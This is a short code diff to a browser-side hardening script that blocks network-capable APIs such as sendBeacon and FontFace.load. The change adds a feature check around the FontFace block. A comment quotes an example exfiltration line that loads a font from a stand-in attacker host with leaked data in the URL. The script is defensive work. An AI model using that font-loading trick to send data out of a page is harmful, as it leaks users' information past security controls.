@@ -46,7 +46,9 @@ block(method(Navigator.prototype, "sendBeacon"), "Navigator.sendBeacon");
 // `new FontFace(family, "url(https://attacker.example/?leak=...)").load()`
 // issues a network request the same way `fetch` does. Block until CSP
 // `font-src` is tightened (GDGT-2373).
-block(method(FontFace.prototype, "load"), "FontFace.load");
+if (window.FontFace) {
+  block(method(window.FontFace.prototype, "load"), "FontFace.load");
+}
 
 // Stylesheet exfiltration. Block both the property accessors and
 // the constructable-stylesheet entry points until CSP `font-src`/`img-src`
